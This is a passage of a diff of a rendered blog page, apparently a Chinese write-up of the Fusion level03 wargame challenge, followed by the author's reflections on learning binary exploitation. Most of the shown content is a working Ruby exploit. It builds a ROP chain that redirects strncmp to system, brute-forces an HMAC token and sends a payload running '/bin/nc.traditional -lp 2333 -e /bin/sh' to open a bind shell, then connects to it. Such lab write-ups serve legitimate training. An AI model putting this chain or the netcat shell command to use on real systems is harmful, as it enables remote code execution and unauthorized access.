+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">p32</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="o">[</span><span class="n">addr</span><span class="o">].</span><span class="n">pack</span> <span class="s1">&#39;I&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">title</span>  <span class="o">=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s1">&#39;\\\\\uAAAA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">27</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;ABCD&#34;</span>       <span class="c1">#ebp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gRequest -&gt; gContents</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># memcpy(void *restrict dst, const void *restrict src, size_t n) : 0x08048e60</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048e60</span> <span class="c1"># memcpy</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804964d</span> <span class="c1"># return addr : pop ebx ; pop esi ; pop edi ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804be08</span> <span class="c1"># *dest     0x804be08 &lt;gRequest&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804bdf4</span> <span class="c1"># *src      0x804bdf4 &lt;gContents&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s1">&#39;\\\\\u0400&#39;</span> <span class="o">+</span> <span class="s1">&#39;\\\\\u0000&#39;</span> <span class="c1"># size = 0x00000004</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># title += p32 0x23332333 # sigsegv for test</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># strncmp -&gt; system</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048bf0</span> <span class="c1"># pop ebx ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xAAA9B8DC</span> <span class="c1"># ebx = strncmp GOT record 0x0804bda0 - 0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08049b4f</span> <span class="c1"># pop eax ; add esp, 0x5c ; ret </span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xFFF28E40</span> <span class="c1"># offset of libc system and strncmp # x strncmp@got.plt</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mh">0x5c</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x080493fe</span> <span class="c1"># add dword ptr [ebx + 0x5d5b04c4], eax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># title += p32 0x08048f50 # call &lt;strncmp@plt&gt; just for test</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># we replaced strncmp with system</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># and replaced gRequest with gContents</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># now the strncmp in &lt;validate_request&gt; acts like:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># system(gContents)</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x8049ab0</span> <span class="c1"># &lt;validate_request&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">hash</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="ss">:tags</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="s1">&#39;meme&#39;</span><span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Ruby to_json issue with error &#34;illegal/malformed utf-8&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># https://stackoverflow.com/questions/18067203/ruby-to-json-issue-with-error-illegal-malformed-utf-8</span>
+</span></span><span class="line"><span class="cl">  <span class="ss">:title</span> <span class="o">=&gt;</span> <span class="s1">&#39;_replace_&#39;</span><span class="p">,</span><span class="c1">#.to_s.force_encoding(&#39;ISO-8859-1&#39;),</span>
+</span></span><span class="line"><span class="cl">  <span class="ss">:contents</span> <span class="o">=&gt;</span> <span class="s1">&#39;/bin/nc.traditional -lp 2333 -e /bin/sh&#39;</span><span class="p">,</span>  <span class="c1">#&#39;/bin/nc.traditional -lp 2333 -e /bin/sh&#39;,</span>
+</span></span><span class="line"><span class="cl">  <span class="ss">:serverip</span> <span class="o">=&gt;</span> <span class="s1">&#39;192.168.215.135:8080&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;==&gt; original json:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">json</span> <span class="o">=</span> <span class="nb">hash</span><span class="o">.</span><span class="n">to_json</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">json</span><span class="o">.</span><span class="n">inspect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;==&gt; replaced json:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dup</span><span class="o">.</span><span class="n">sub!</span> <span class="s2">&#34;_replace_&#34;</span><span class="p">,</span> <span class="n">title</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">json</span><span class="o">.</span><span class="n">inspect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;==&gt; calculating hmac...&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kp">true</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># random string to make the result of hmac different every time</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ranstr</span> <span class="o">=</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">hex</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">#json = hash.to_json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1"># add this &#34;\n&#34; to seperate token and payload</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># or the json_tokener_parse(gRequest) in parse_request() will not work</span>
+</span></span><span class="line"><span class="cl">  <span class="n">payload</span> <span class="o">=</span> <span class="n">token</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">json</span> <span class="o">+</span> <span class="n">ranstr</span>
+</span></span><span class="line"><span class="cl">  <span class="n">hmac</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span> <span class="s1">&#39;SHA1&#39;</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">payload</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">hmac</span><span class="o">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">3</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&#34;0000&#34;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">puts</span> <span class="s2">&#34;done&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">puts</span> <span class="s2">&#34;==&gt; use random string:</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">ranstr</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">puts</span> <span class="s2">&#34;==&gt; created payload:</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">inspect</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">puts</span> <span class="s2">&#34;==&gt; hmac result:</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">hmac</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># &#34;00008ad10c00e3...&#34; =&gt; &#34;\x00\x00\x8A\xD1\f\x00\xE3...&#34; </span>
+</span></span><span class="line"><span class="cl">    <span class="n">hmac</span> <span class="o">=</span> <span class="o">[</span><span class="n">hmac</span><span class="o">].</span><span class="n">pack</span> <span class="s1">&#39;H*&#39;</span>   
+</span></span><span class="line"><span class="cl">    <span class="k">break</span> <span class="k">end</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="vg">$socket</span><span class="o">.</span><span class="n">write</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">press_to_c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">=begin
+</span></span></span><span class="line"><span class="cl"><span class="cm">  ...
+</span></span></span><span class="line"><span class="cl"><span class="cm">  while(1) {
+</span></span></span><span class="line"><span class="cl"><span class="cm">    ret = read(0, gRequest + gRequestSize, gRequestMax - gRequestSize);
+</span></span></span><span class="line"><span class="cl"><span class="cm">    if(ret == 0) break;
+</span></span></span><span class="line"><span class="cl"><span class="cm">  ...
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">BasicSocket#close_write:
+</span></span></span><span class="line"><span class="cl"><span class="cm">  Disallows further write using shutdown system call.
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">use this to make read return 0
+</span></span></span><span class="line"><span class="cl"><span class="cm">use $socket.close will cause Broken Pipe
+</span></span></span><span class="line"><span class="cl"><span class="cm">=end</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$socket</span><span class="o">.</span><span class="n">close_write</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">system</span> <span class="s2">&#34;nc </span><span class="si">#{</span><span class="n">hostname</span><span class="si">}</span><span class="s2"> 2333&#34;</span>
+</span></span></code></pre></div></details>
+<br>
+加了英文注释本来是想上传 GitHub 的
+<p>但是姑且还是把 Fusion 的题目全做完了再一起传吧</p>
+<p>以及草稿</p>
+<p><img src="/p/fusion_level_03/trial_and_error.png"
+	width="1234"
+	height="2146"
+	srcset="/p/fusion_level_03/trial_and_error_hud12e431804f6bbaf5289751d0b70e8e8_824895_480x0_resize_box_3.png 480w, /p/fusion_level_03/trial_and_error_hud12e431804f6bbaf5289751d0b70e8e8_824895_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="trial_and_error.png"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="57"
+		data-flex-basis="138px"
+	
+></p>
+<p>真的试了好多好多次&hellip;</p>
+<p>前后加起来有三个星期才总算把这个做出来</p>
+<br>
+<p>从因为疫情被封的三月中旬到现在，也就两个半月的时间</p>
+<p>真的学到了好多&hellip;</p>
+<p>从完全不会 pwn 到 现在第一次自己成功 ROP</p>
+<p>还顺带喜欢上了 ruby 和 vim x</p>
+<p>还顺便养成了看英文资料的习惯（或者说根本就找不到多少相关的中文资料</p>
+<p>这一切都是命运石之门的选择x</p>
+<p>不过明天真的就要返校了..</p>
+<p>姑且把开了几个月的 Terminal 和 Safari 标签页都关掉了&hellip;</p>
+<p>再打开来的话大概是七月了呢&hellip;</p>
+<p>啊总之笔记本没电了，先爬爬x</p>
+<p><img src="/p/fusion_level_03/battery.png"
+	width="1046"
+	height="454"
+	srcset="/p/fusion_level_03/battery_hu5cf1e39aab24deea0face06f2a5ad4d3_171328_480x0_resize_box_3.png 480w, /p/fusion_level_03/battery_hu5cf1e39aab24deea0face06f2a5ad4d3_171328_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="battery.png"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="230"
+		data-flex-basis="552px"
+	
+></p>
+<hr>
+<p>Thanks for reading.</p>
+<p>Sponsors:</p>
+<ul>
+<li>
+<p>My not-yet-arrived keyboard</p>
+</li>
+<li>
+<p>Cute cats in the compound</p>
+</li>
+<li>
+<p>macOS Calculator</p>
+</li>
+<li>
+<p>My IKEA Shark Hikari.Sa（鲨·光光</p>
+</li>
+<li>
+<p><a class="link" href="https://blog.fuckgfw233.org"  target="_blank" rel="noopener"
+    >baka Cat Minty w</a></p>
+</li>
+</ul>
 
 </section>
 
@@ -1351,7 +1617,19 @@ if (!doNotTrack) {
     <footer class="article-footer">
     
 
-    </footer>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jun 05, 2022 11:10 UTC
+        </span>
+    </section></footer>
 
 
     
@@ -1702,19 +1980,19 @@ if (!doNotTrack) {
       </ol>
     </li>
     <li><a href="#interact-with-program">Interact with Program</a></li>
-    <li><a href="#find-out-rop-chain">Find Out ROP chain</a></li>
+    <li><a href="#find-out-rop-chain">Find Out ROP Chain</a></li>
     <li><a href="#create-rop-chain">Create ROP Chain</a>
       <ol>
         <li><a href="#plt-got-gotplt">plt? got? got.plt??</a></li>
       </ol>
     </li>
     <li><a href="#end">END?</a></li>
-    <li><a href="#ignore-above-the-real-solution">Ignore Above; The REAL Solution:</a>
+    <li><a href="#the-true-solution">The TRUE Solution</a>
       <ol>
-        <li><a href="#1-data-grequest---gcontent">1. <code>.data</code>: <code>gRequest -&gt; gContent</code></a></li>
-        <li><a href="#2-pltgot-strncmp---system">2. <code>.plt.got</code>: <code>strncmp -&gt; system</code></a></li>
+        <li><a href="#gnu-indirect-function">GNU Indirect Function</a></li>
       </ol>
     </li>
+    <li><a href="#end-1">END.</a></li>
   </ol>
 </nav>
         </div>
